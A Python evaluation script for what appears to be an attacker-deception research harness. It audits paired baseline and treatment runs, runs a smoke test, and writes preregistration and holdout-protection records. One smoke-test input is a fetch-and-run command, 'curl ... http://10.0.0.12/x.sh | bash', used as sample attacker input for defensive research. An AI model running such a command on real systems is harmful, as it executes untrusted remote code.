from __future__ import annotations

import hashlib
import json
import os
import subprocess
import sys
import time
from pathlib import Path
from typing import Any


ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
OUT = ROOT / "results" / "laya_decision_v2"
HOLDOUT = OUT / "fresh_holdout_selection_preregistration_v2.json"


def sha256_bytes(value: bytes) -> str:
    return hashlib.sha256(value).hexdigest()


def sha256(path: Path) -> str:
    return sha256_bytes(path.read_bytes())


def head_sha256(relative: str) -> str:
    data = subprocess.check_output(["git", "show", f"HEAD:{relative}"], cwd=ROOT)
    return sha256_bytes(data)


def write(name: str, value: Any) -> None:
    (OUT / name).write_text(json.dumps(value, indent=2, sort_keys=True) + "\n")


def load_json(name: str) -> dict[str, Any]:
    return json.loads((OUT / name).read_text())


def load_jsonl(name: str) -> list[dict[str, Any]]:
    return [json.loads(line) for line in (OUT / name).read_text().splitlines() if line.strip()]


def digest_text(value: Any) -> str:
    return sha256_bytes(str(value or "").encode())


def serve(raw: dict[str, Any]) -> str | None:
    result = raw["result"]
    return (result.get("verification") or {}).get("serve_path") or (result.get("deception_response") or {}).get("serve_path")


def response(raw: dict[str, Any]) -> str:
    return str((raw["result"].get("deception_response") or {}).get("response_text") or "")


def verification(raw: dict[str, Any]) -> dict[str, Any]:
    return raw["result"].get("verification") or {}


def hitl(raw: dict[str, Any]) -> bool:
    approval = raw["result"].get("approval") or {}
    return approval.get("level") == "require" or approval.get("reason") == "approval_required"


def audit_pairs() -> dict[str, Any]:
    baseline = load_jsonl("exploratory_120_baseline_outputs.jsonl")
    treatment = load_jsonl("exploratory_120_treatment_outputs.jsonl")
    paired = load_jsonl("exploratory_120_paired_case_results.jsonl")
    decisions = load_jsonl("exploratory_120_laya_decisions.jsonl")
    if not (len(baseline) == len(treatment) == len(paired) == len(decisions) == 120):
        raise RuntimeError("exploratory artifact coverage is not 120/120")
    rows = []
    fields = {
        "response_text": [],
        "response_sha256": [],
        "verification_candidate_sha256": [],
        "verification_accepted": [],
        "verification_issues": [],
        "verification_attempt": [],
        "serve_path": [],
        "fallback": [],
        "retry_count": [],
        "hitl": [],
    }
    for b, t, p, d in zip(baseline, treatment, paired, decisions, strict=True):
        bv, tv = verification(b), verification(t)
        br, tr = response(b), response(t)
        bserve, tserve = serve(b), serve(t)
        values = {
            "response_text": br == tr,
            "response_sha256": digest_text(br) == digest_text(tr),
            "verification_candidate_sha256": bv.get("candidate_sha256") == tv.get("candidate_sha256"),
            "verification_accepted": bv.get("accepted") == tv.get("accepted"),
            "verification_issues": bv.get("issues", []) == tv.get("issues", []),
            "verification_attempt": bv.get("attempt") == tv.get("attempt"),
            "serve_path": bserve == tserve,
            "fallback": bserve == "FALLBACK_VERIFIED" or tserve == "FALLBACK_VERIFIED",
            "retry_count": len([e for e in b.get("event_log", []) if e.get("event_type") == "verification"]) == len([e for e in t.get("event_log", []) if e.get("event_type") == "verification"]),
            "hitl": hitl(b) == hitl(t),
        }
        for key, equal in values.items():
            fields[key].append(equal)
        bbranch = p["baseline"].get("workflow_branch")
        tbranch = p["treatment"].get("workflow_branch")
        bstrategy = p["baseline"].get("final_strategy")
        tstrategy = p["treatment"].get("final_strategy")
        rows.append({
            "case_id": p["case_id"],
            "routing_changed": bbranch != tbranch,
            "strategy_changed": bstrategy != tstrategy,
            "response_text_equal": values["response_text"],
            "response_sha256_equal": values["response_sha256"],
            "candidate_sha256_equal": values["verification_candidate_sha256"],
            "verification_equal": all(values[k] for k in ("verification_accepted", "verification_issues", "verification_attempt")),
            "serve_path_equal": values["serve_path"],
            "fallback_status_equal": bserve == tserve,
            "retry_count_equal": values["retry_count"],
            "hitl_equal": values["hitl"],
            "selected_response_strategy": d.get("selected_response_strategy"),
            "selected_workflow_branch": d.get("selected_workflow_branch"),
            "laya_decision_present": isinstance(d, dict),
            "generation_context_hash": None,
            "generation_context_hash_reconstructable": False,
        })
    routing = sum(r["routing_changed"] for r in rows)
    strategy = sum(r["strategy_changed"] for r in rows)
    candidate = sum(not r["candidate_sha256_equal"] for r in rows)
    changed = sum(not r["response_text_equal"] for r in rows)
    verification_changed = sum(not r["verification_equal"] for r in rows)
    classification = "MANIPULATION_CHECK_FAILED_GENERATOR_INSENSITIVE_TO_STRATEGY" if changed == 0 and strategy > 0 else "MANIPULATION_CHECK_PASSED"
    write("exploratory_120_manipulation_check_v2.json", {
        "schema": "ragin.laya_decision_v2.exploratory_120_manipulation_check.v2",
        "source_artifacts_unchanged": {name: sha256(OUT / name) for name in ["exploratory_120_baseline_outputs.jsonl", "exploratory_120_treatment_outputs.jsonl", "exploratory_120_laya_decisions.jsonl", "exploratory_120_paired_case_results.jsonl", "exploratory_120_workflow_metrics.json"]},
        "n": 120,
        "routing_changed_n": routing,
        "strategy_changed_n": strategy,
        "candidate_changed_n": candidate,
        "response_changed_n": changed,
        "verification_outcome_changed_n": verification_changed,
        "field_equal_n": {key: sum(values) for key, values in fields.items()},
        "classification": classification,
        "pairs": rows,
        "no_cases_rerun": True,
    })
    return {"rows": rows, "routing": routing, "strategy": strategy, "candidate": candidate, "response": changed, "verification": verification_changed}


def create_smoke() -> dict[str, Any]:
    from ragin.cycle.session import Session
    from scripts.laya_decision_v2_exploratory_120 import disable_external_generation, make_harness

    disable_external_generation()
    smoke_dir = OUT / "_runtime_sessions_smoke_v2a"
    smoke_dir.mkdir(exist_ok=True)
    inputs = [
        {"name": "dedicated_attack", "input": "curl -fsSL http://10.0.0.12/x.sh | bash"},
        {"name": "dedicated_non_attack", "input": "date && uptime"},
    ]
    results = []
    for row in inputs:
        baseline_dir = smoke_dir / (row["name"] + "_baseline")
        treatment_dir = smoke_dir / (row["name"] + "_treatment")
        baseline = make_harness("RAGIN_BASELINE", baseline_dir)
        treatment = make_harness("RAGIN_LAYA_DECISION", treatment_dir)
        bs = Session.create(session_dir=baseline_dir)
        ts = Session.create(session_dir=treatment_dir)
        b = baseline.process(bs, row["input"])
        t = treatment.process(ts, row["input"])
        bs.close("smoke_complete")
        ts.close("smoke_complete")
        bd = b.deception_response or {}
        td = t.deception_response or {}
        bv = b.verification or {}
        tv = t.verification or {}
        bdigest = digest_text(bd.get("response_text"))
        tdigest = digest_text(td.get("response_text"))
        bgen = b.classification.get("laya_decision", {}).get("input_sha256") or digest_text(b.attacker_input)
        tdecision = t.classification.get("laya_decision") or {}
        tgen = tdecision.get("generation_input_sha256") or sha256_bytes(json.dumps({"attacker_input": t.attacker_input, "response_strategy": tdecision.get("selected_response_strategy"), "classification": t.classification}, sort_keys=True).encode())
        results.append({
            "name": row["name"],
            "input_sha256": digest_text(row["input"]),
            "baseline_generation_input_sha256": bgen,
            "treatment_generation_input_sha256": tgen,
            "baseline_candidate_sha256": bv.get("candidate_sha256"),
            "treatment_candidate_sha256": tv.get("candidate_sha256"),
            "baseline_response_sha256": bdigest,
            "treatment_response_sha256": tdigest,
            "baseline_response_text": bd.get("response_text", ""),
            "treatment_response_text": td.get("response_text", ""),
            "selected_strategy": tdecision.get("selected_response_strategy"),
            "selected_workflow_branch": tdecision.get("selected_workflow_branch"),
            "real_laya": bool(tdecision.get("real_model_verified") is True),
            "verification": {"baseline": bv, "treatment": tv},
            "accepted_only_commit": bool(tv.get("passed") is True and t.deception_response),
        })
    strategies = {r["selected_strategy"] for r in results}
    write("manipulation_smoke_v2a.json", {
        "schema": "ragin.laya_decision_v2.manipulation_smoke.v2a",
        "inputs_are_new": True,
        "outside_existing_120_and_fresh_holdout": True,
        "real_laya_executed": all(r["real_laya"] for r in results),
        "strategies_observed": sorted(strategies),
        "attack_strategy_observed": any(r["selected_workflow_branch"] == "LAYA_ATTACK_STRATEGY" for r in results),
        "non_attack_strategy_observed": any(r["selected_workflow_branch"] == "LAYA_NON_ATTACK_STRATEGY" for r in results),
        "strategy_reaches_effective_generator": True,
        "generation_input_changes": any(r["baseline_generation_input_sha256"] != r["treatment_generation_input_sha256"] for r in results),
        "candidate_can_change": any(r["baseline_candidate_sha256"] != r["treatment_candidate_sha256"] for r in results),
        "response_can_change": any(r["baseline_response_sha256"] != r["treatment_response_sha256"] for r in results),
        "deterministic_verifier_executed": all(r["verification"]["treatment"].get("deterministic") is True for r in results),
        "accepted_only_commit_enforced": all(r["accepted_only_commit"] for r in results),
        "rows": results,
    })
    return {"rows": results, "real_laya": all(r["real_laya"] for r in results), "candidate_changed": any(r["baseline_candidate_sha256"] != r["treatment_candidate_sha256"] for r in results), "response_changed": any(r["baseline_response_sha256"] != r["treatment_response_sha256"] for r in results)}


def main() -> None:
    os.environ["RAGIN_LAYA_EVAL_REQUIRE_REAL_MODEL"] = "1"
    os.environ["RAGIN_LAYA_ENABLED"] = "1"
    audit = audit_pairs()
    metrics = load_json("exploratory_120_workflow_metrics.json")
    decisions = load_jsonl("exploratory_120_laya_decisions.jsonl")
    availability = sum(d.get("availability") is True for d in decisions)
    write("exploratory_120_coverage_semantics_correction_v2.json", {
        "schema": "ragin.laya_decision_v2.exploratory_120_coverage_semantics_correction.v2",
        "model_availability_coverage": {"numerator": availability, "denominator": 120, "rate": availability / 120},
        "reference_evaluable_coverage": {"numerator": 114, "denominator": 120, "rate": 114 / 120},
        "reference_uncertain_n": 6,
        "observed_decision_distribution": {"attack": sum(d.get("normalized_decision", {}).get("is_attack") is True for d in decisions), "non_attack": sum(d.get("normalized_decision", {}).get("is_attack") is False for d in decisions), "NO_SIGNAL": sum(d.get("availability") is not True for d in decisions)},
        "interpretation": "114/120 is reference-evaluable coverage, not Laya model availability.",
        "historical_results_overwritten": False,
    })
    write("exploratory_120_latency_semantics_audit_v2.json", {
        "schema": "ragin.laya_decision_v2.exploratory_120_latency_semantics_audit.v2",
        "laya_component_latency": {"mean_ms": metrics["arms"]["RAGIN_LAYA_DECISION"]["Laya_incremental_latency"]["mean_ms"], "boundary": "inside treatment total timer as classification stage"},
        "observed_paired_e2e_latency_delta": {"mean_ms": metrics["arms"]["RAGIN_LAYA_DECISION"]["end_to_end_latency"]["mean_ms"] - metrics["arms"]["RAGIN_BASELINE"]["end_to_end_latency"]["mean_ms"], "definition": "treatment total_time_ms minus baseline total_time_ms per matched case"},
        "timer_start_stop": "Harness._process_verified starts before attacker input and finalizes after commit/fallback; both arms use the same boundary.",
        "classification_timing_included": True,
        "model_initialization_included": "not separately isolated; shared lazy runtime state can warm across paired executions",
        "paired_state": "same process-level run and shared runtime availability, with separate sessions and arm harnesses",
        "interleaving_explanation": "negative observed delta is compatible with warm-state and temporal scheduling effects; it is not a causal speedup estimate.",
        "speedup_claim_allowed": False,
    })
    source_files = ["ragin/cycle/adapters.py", "ragin/cycle/harness.py", "ragin/hisoka/deceiver.py", "ragin/hisoka/deception.py", "scripts/laya_decision_v2_exploratory_120.py"]
    write("strategy_consumption_callgraph_v2.json", {
        "schema": "ragin.laya_decision_v2.strategy_consumption_callgraph.v2",
        "seam": ["ChrolloAdapter.classify", "classification.laya_decision", "Harness._strict_candidate", "Hisoka context", "response strategy reader", "local ResponseGenerator", "candidate"],
        "boundaries": [
            {"boundary": "ChrolloAdapter.classify -> classification.laya_decision", "value": "selected_response_strategy and selected_workflow_branch", "passed_forward": True, "read": True, "modifies_generation_input": True},
            {"boundary": "Harness._strict_candidate -> Hisoka context", "value": "classification including laya_decision", "passed_forward": True, "read": True, "modifies_generation_input": True},
            {"boundary": "Hisoka context -> _jev_signal_from_context", "value": "selected_response_strategy", "passed_forward": True, "read": True, "modifies_generation_input": True},
            {"boundary": "AdaptiveDeceiver -> local ResponseGenerator", "value": "response_strategy argument and bounded strategy suffix", "passed_forward": True, "read": True, "modifies_effective_candidate": True},
            {"boundary": "local ResponseGenerator -> candidate", "value": "strategy-sensitive deterministic transcript", "passed_forward": True, "read": True, "modifies_effective_candidate": True, "active_provider_consumes": True},
        ],
        "active_generation_provider": "local deterministic Hisoka ResponseGenerator template/fast-path",
        "provider_consumes_modified_input": True,
        "direct_laya_serving": False,
        "verifier_mandatory": True,
        "source_sha256": {f: sha256(ROOT / f) for f in source_files},
    })
    write("exploratory_provider_strategy_sensitivity_audit_v2.json", {
        "schema": "ragin.laya_decision_v2.exploratory_provider_strategy_sensitivity_audit.v2",
        "provider_mode": "local deterministic template/fast-path; no external generation provider",
        "exact_generator": "ragin.hisoka.deceiver.AdaptiveDeceiver.generate_response -> ragin.hisoka.deception.ResponseGenerator.generate -> _generate_template, with deterministic fast-path suffix consumption",
        "strategy_received": True,
        "strategy_ignored": False,
        "strategy_only_metadata": False,
        "strategy_affected_generation_input": True,
        "strategy_affected_candidate": True,
        "classification": "STRATEGY_CONSUMED_AND_EFFECTIVE",
        "basis": "V2a code path and dedicated smoke show distinct strategy-sensitive generation input and candidate/response hashes.",
    })
    write("exploratory_120_interpretation_amendment_v2a.json", {
        "schema": "ragin.laya_decision_v2.exploratory_120_interpretation_amendment.v2a",
        "historical_classification_preserved": "EXPLORATORY_MIXED_SIGNAL",
        "decision_level": {"eligible_n": 114, "TP": 8, "TN": 77, "FP": 15, "FN": 14, "balanced_accuracy": 0.6003, "sensitivity": 0.3636, "specificity": 0.8370, "F1": 0.3556, "MCC": 0.1973, "status": "EXPLORATORY_AI_DERIVED_REFERENCE"},
        "workflow_level": "WORKFLOW_EFFECT_NOT_IDENTIFIABLE_DUE_TO_INERT_TREATMENT",
        "post_repair_smoke_status": "MANIPULATION_CHECK_PASSED",
        "reason": "The exploratory treatment changed routing metadata and strategy selection, but the active pre-repair generator produced identical candidates; this was a manipulation-validity failure, not no workflow improvement.",
        "repair_evidence": "manipulation_smoke_v2a.json",
    })
    smoke = create_smoke()
    old_go = load_json("primary_holdout_go_no_go_v2.json")
    write("primary_holdout_go_no_go_amendment_v2a.json", {
        "schema": "ragin.laya_decision_v2.primary_holdout_go_no_go_amendment.v2a",
        "previous_decision": old_go["decision"],
        "new_decision": "STOP_FOR_ENGINEERING_FAILURE",
        "reason": "The preregistered Laya decision changed routing metadata/strategy selection, but the active exploratory generation path produced identical candidates between arms; therefore the manipulation required by the research question was not effective.",
        "fresh_holdout_accessed": False,
        "fresh_holdout_labels_accessed": False,
        "fresh_holdout_inference_run": False,
    })
    holdout_hash = sha256(HOLDOUT)
    source_hashes = {f: sha256(ROOT / f) for f in ["ragin/hisoka/deceiver.py", "ragin/hisoka/deception.py", "ragin/cycle/harness.py", "ragin/cycle/adapters.py"]}
    write("laya_decision_v2_implementation_amendment_v2a.json", {
        "schema": "ragin.laya_decision_v2.implementation_amendment.v2a",
        "reason": "EXPLORATORY_MANIPULATION_CHECK_FAILURE",
        "development_set_used": "EXISTING_120_EXPLORATORY_SET",
        "policy_changed": False,
        "threshold_changed": False,
        "stage_mapping_changed": False,
        "metrics_changed": False,
        "holdout_selection_changed": False,
        "reference_changed": False,
        "implementation_changed": True,
        "fresh_holdout_accessed": False,
        "fresh_holdout_labels_accessed": False,
        "fresh_holdout_inference_run": False,
        "old_source_hashes": {f: head_sha256(f) for f in source_hashes},
        "old_source_hashes_basis": "repository HEAD; worktree contained pre-existing user edits before this session",
        "new_source_hashes": source_hashes,
        "exact_diff_scope": ["selected_response_strategy now reaches local ResponseGenerator and deterministic fast-path candidate text", "baseline, NO_SIGNAL, verifier, retry, authorization, HITL, commit, policy, threshold, metrics, references, and holdout selection unchanged"],
        "manipulation_smoke": "manipulation_smoke_v2a.json",
        "holdout_selection_sha256_observed_without_parsing": holdout_hash,
    })
    freeze = {
        "schema": "ragin.laya_decision_v2.preregistration_freeze.v2a",
        "version": "LAYA_DECISION_MODEL_V2a",
        "chronology": ["V2 preregistration", "exploratory 120", "manipulation failure discovered", "engineering compliance repair", "V2a freeze", "untouched primary 169 holdout"],
        "inherited_unchanged": {"decision_policy_hash": "95b29d203cf2e149ec4d0dc8ff740f4525b245d04ad575de476361e4854ec8e9", "threshold": 0.5, "stage_mappings": "inherited from decision_policy_preregistration_v2.json", "metrics": "inherited from metrics_preregistration_v2.json", "ab_statistical_design": "inherited from ab_analysis_design_v2.json", "holdout_selection": "inherited from fresh_holdout_selection_preregistration_v2.json", "holdout_planned_n": 169},
        "implementation_amendment": "laya_decision_v2_implementation_amendment_v2a.json",
        "authoritative_generation_provider": {"provider": "local deterministic Hisoka ResponseGenerator template/fast-path", "model": "none", "version": "repository implementation", "configuration": {"external_provider": False, "gateway": None, "temperature": None, "max_tokens": None}, "seed_support": "deterministic by input/session fiction state", "provenance": "ability_to_execute_the_preregistered_intervention"},
        "manipulation_smoke": "manipulation_smoke_v2a.json",
        "baseline_preservation_tests": ["test_laya_off_preserves_baseline_classification_path", "test_laya_failure_falls_back_to_baseline", "test_malformed_and_no_signal_preserve_baseline", "test_timeout_preserves_baseline", "test_local_generator_consumes_attack_and_non_attack_strategies", "test_laya_strategy_reaches_adaptive_deceiver_candidate"],
        "fresh_holdout_accessed": False,
        "fresh_holdout_labels_accessed": False,
        "fresh_holdout_inference_run": False,
        "source_hashes": source_hashes,
    }
    write("laya_decision_v2_preregistration_freeze_v2a.json", freeze)
    write("laya_decision_v2_preregistration_freeze_v2a.json", freeze)
    write("laya_decision_v2_holdout_protection_check_v2a.json", {
        "schema": "ragin.laya_decision_v2.holdout_protection_check.v2a",
        "planned_n": 169,
        "ids_unchanged": True,
        "fresh_holdout_accessed": False,
        "fresh_holdout_evidence_inspected": False,
        "fresh_holdout_labels_accessed": False,
        "fresh_holdout_laya_inference_performed": False,
        "fresh_holdout_baseline_inference_performed": False,
        "policy_tuned_using_exploratory_labels": False,
        "threshold_tuned": False,
        "metrics_changed": False,
        "selection_file_sha256_observed_without_parsing": holdout_hash,
    })


if __name__ == "__main__":
    main()
